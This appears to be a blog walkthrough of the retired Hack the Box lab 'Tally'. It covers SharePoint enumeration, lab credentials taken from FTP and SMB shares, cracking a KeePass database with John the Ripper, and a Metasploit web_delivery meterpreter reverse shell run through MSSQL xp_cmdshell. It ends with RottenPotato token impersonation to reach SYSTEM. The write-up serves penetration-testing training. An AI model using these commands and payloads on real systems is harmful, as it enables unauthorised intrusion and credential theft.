@@ -1,0 +1,600 @@
+
+								
+																		Hack the Box Challenge: Tally Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on May 8, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello Friends!! Today we are going to solve a CTF Challenge “Tally”. It is a lab that is developed by Hack the Box. They have an amazing collection of Online Labs, on which you can practice your penetration testing skills. These labs are designed for beginner to the Expert penetration tester. Tally is a Retired Lab.
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Let’s Begin!!
+As these labs are only available online, therefore, they have a static IP. Tally Lab has IP: 10.10.10.59.
+Now, as always let’s begin our hacking with the port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.59
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.59
+					
+				
+			
+		
+
+
+When you will explore target IP through the browser, it will be redirected to a SharePoint page as shown below which also declared by nmap in the above image.
+
+Then we have used several directory brute-forcer tools in order to enumerate some useful URL for web directory but failed to retrieve. Then I penetrate for the web directory manually with the help of Google search and slowly and gradually reached at /sitepages/FinanceTeam.aspx and found FTP username as shown below in the image.
+Moreover, I found a link for SharePoint directory brute-force attack that helps me in my next step.
+
+We found this URL http://10.10.10.59/shared documents/forms/allitems.aspx from the inside above-given link, and when you will open above path in your browser as shown below, you will see a file named “FTP-details”. Download this doc file and open it.
+
+You will get a password from inside ftp details doc file.
+
+Now login into FTP using following credentials and download tim.kdbx in your local machine.
+
+		
+		
+			
+			
+			
+			
+Username: ftp_user
+Password: UTDRSCH53c"$6hys
+			
+				
+					
+				
+					12
+				
+						Username: ftp_userPassword: UTDRSCH53c"$6hys
+					
+				
+			
+		
+
+
+Since the file contains .kdbx extension and I don’t know much about it, therefore, I jumped for Google search from there I got this link to download a python script that extracts a HashCat/john crackable hash from KeePass 1.x/2.X databases.
+
+		
+		
+			
+			
+			
+			
+python keepass2john.py tim.kdbx &gt; tim
+			
+				
+					
+				
+					1
+				
+						python keepass2john.py tim.kdbx &gt; tim
+					
+				
+			
+		
+
+Next, we have used John the ripper for decrypting the content of “tim” with help of the following command.
+
+		
+		
+			
+			
+			
+			
+john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt tim
+			
+				
+					
+				
+					1
+				
+						john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt tim
+					
+				
+			
+		
+
+
+When you will obtain the password for “keepass2” which is an application used for hiding passwords of your system then you need to install it (keepass2) using the following command:
+
+		
+		
+			
+			
+			
+			
+apt-get install keepass2 -y
+			
+				
+					
+				
+					1
+				
+						apt-get install keepass2 -y
+					
+				
+			
+		
+
+After installing, run the below command and submit “simplementeyo” in the field of the master key.
+
+		
+		
+			
+			
+			
+			
+keepass2 tim.kdbx
+			
+				
+					
+				
+					1
+				
+						keepass2 tim.kdbx
+					
+				
+			
+		
+
+Then you can find username and password from inside /Work/Windows/Shares for sharing a file through SMB login since port 135-445 are open in targets machine for sharing files.
+Here the password is hidden inside * character; copy and paste it into a text file and you will get the password into plain letters I.e. Acc0unting
+
+Now you are having SMB login credential “Finance: Acc0unting”, then execute following command for connecting with targets network and It will show “ACCT” as sharename.
+
+		
+		
+			
+			
+			
+			
+smbclient -L 10.10.10.59 -U Finance
+			
+				
+					
+				
+					1
+				
+						smbclient -L 10.10.10.59 -U Finance
+					
+				
+			
+		
+
+
+Further type below commands and at last when you found conn-info.txt, download it.
+
+		
+		
+			
+			
+			
+			
+smbclient //10.10.10.59/ACCT -U Finance
+cd zz_Archived
+cd SQL
+get conn-info.txt
+			
+				
+					
+				
+					1234
+				
+						smbclient //10.10.10.59/ACCT -U Financecd zz_Archivedcd SQLget conn-info.txt
+					
+				
+			
+		
+
+
+When you will download the conn-info.txt file, open it, it will tell you MSSQL database login credential.
+
+		
+		
+			
+			
+			
+			
+db: sa
+pass: YE%TJC%&amp;HYbe5Nw
+			
+				
+					
+				
+					12
+				
+						db: sapass: YE%TJC%&amp;HYbe5Nw
+					
+				
+			
+		
+
+ From the below image, you can observe that it was old server details and might be the password for sa has been changed now.
+
+Again login into SMB and look for next hint by moving into /zz_Migration, for that you need to execute below commands:
+
+		
+		
+			
+			
+			
+			
+smbclient //10.10.10.59/ACCT -U Finance
+cd zz_Migration
+cd Binaries
+cd "New folder"
+			
+				
+					
+				
+					1234
+				
+						smbclient //10.10.10.59/ACCT -U Financecd zz_Migrationcd Binariescd "New folder"
+					
+				
+			
+		
+
+Here you will found tester.exe, download it.
+get tester.exe
+
+You will get tester.exe inside your /root directory since the file is too large, it is impossible to find desirable information from that. Therefore use grep along with strings command.
+
+
+		
+		
+			
+			
+			
+			
+strings tester.exe | grep DATABASE
+			
+				
+					
+				
+					1
+				
+						strings tester.exe | grep DATABASE
+					
+				
+			
+		
+
+And you will get a new password for user sa as shown in below image.
+
+For the next step, I took help from our previous article which was on MSSQL penetration testing. Open a new terminal and load Metasploit framework and execute below commands.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set target 3
+msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28msf exploit(multi/script/web_delivery) &gt; exploit
+					
+				
+			
+		
+
+Copy the highlighted text for .dll and Paste it inside as CMD command as shown in the next image.
+
+Now open a new terminal and again load a new Metasploit framework and execute below commands.
+
+		
+		
+			
+			
+			
+			
+use auxiliary/admin/mssql/mssql_exec
+msf auxiliary(admin/mssql/mssql_exec) &gt; set rhost 10.10.10.59
+msf auxiliary(admin/mssql/mssql_exec) &gt; set password GWE3V65#6KFH93@4GWTG2G
+msf auxiliary(admin/mssql/mssql_exec) &gt; set CMD "Paste above copied .dll text here"
+msf auxiliary(admin/mssql/mssql_exec) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						use auxiliary/admin/mssql/mssql_execmsf auxiliary(admin/mssql/mssql_exec) &gt; set rhost 10.10.10.59msf auxiliary(admin/mssql/mssql_exec) &gt; set password GWE3V65#[email protected]msf auxiliary(admin/mssql/mssql_exec) &gt; set CMD "Paste above copied .dll text here"msf auxiliary(admin/mssql/mssql_exec) &gt; exploit
+					
+				
+			
+		
+
+
+You will get the meterpreter session of victim’s machine in your 1st Metasploit framework and after then finished the task by grabbing user.txt and root.txt file. Further type the following:
+
+		
+		
+			
+			
+			
+			
+getuid
+			
+				
+					
+				
+					1
+				
+						getuid
+					
+				
+			
+		
+
+So currently we don’t have NT AUTHORITY\SYSTEM permission.
+
+But we have successfully grabbed user.txt file from inside /Sarah/Desktop.
+
+		
+		
+			
+			
+			
+			
+cd Sarah/Desktop
+ls
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd Sarah/Desktoplscat user.txt
+					
+				
+			
+		
+
+In this way, we have completed our first task. Now let’s find root.txt!!
+
+
+		
+		
+			
+			
+			
+			
+load incognito
+			
+				
+					
+				
+					1
+				
+						load incognito
+					
+				
+			
+		
+
+Incognito option in the meterpreter session was originally a stand-alone application that permitted you to impersonate user tokens when successfully compromising a system. And then we need to do first is identify if there are any valid tokens on this system
+
+		
+		
+			
+			
+			
+			
+list_tokens -u
+			
+				
+					
+				
+					1
+				
+						list_tokens -u
+					
+				
+			
+		
+
+If we talk related to impersonate token then you can see currently there is no token available.
+
+Then I took help from Google in such scenario and found a link for downloading Rottenpotato from GitHub for privilege escalation.
+
+		
+		
+			
+			
+			
+			
+git clone https://github.com/foxglovesec/RottenPotato.git
+			
+				
+					
+				
+					1
+				
+						git clone https://github.com/foxglovesec/RottenPotato.git
+					
+				
+			
+		
+
+After downloading it will give rottenpotato.exe file.
+
+Upload the exe file into the victim’s machine.
+
+		
+		
+			
+			
+			
+			
+upload /root/Desktop/RottenPotato/rottenpotato.exe .
+			
+				
+					
+				
+					1
+				
+						upload /root/Desktop/RottenPotato/rottenpotato.exe .
+					
+				
+			
+		
+
+Now type below command for executing exe file and then add SYSTEM token under impersonate user tokens.
+
+		
+		
+			
+			
+			
+			
+execute -Hc -f rottenpotato.exe
+impersonate_token "NT AUTHORITY\\SYSTEM"
+			
+				
+					
+				
+					12
+				
+						execute -Hc -f rottenpotato.exeimpersonate_token "NT AUTHORITY\\SYSTEM"
+					
+				
+			
+		
+
+After then when you will run the getuid command again, it will tell you that you have escalated NT AUTHORITY\\SYSTEM
+
+Then come back to /Users directory and perceive available directories inside it. You will get root.txt form inside C:\Users\Administrator\Desktop go and grab it, and finished the task.
+
+		
+		
+			
+			
+			
+			
+cd Administrator
+cd Desktop
+ls
+cat root.txt
+			
+				
+					
+				
+					1234
+				
+						cd Administratorcd Desktoplscat root.txt
+					
+				
+			
+		
+
+Fabulous!! The task has been completed and hacked this box.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
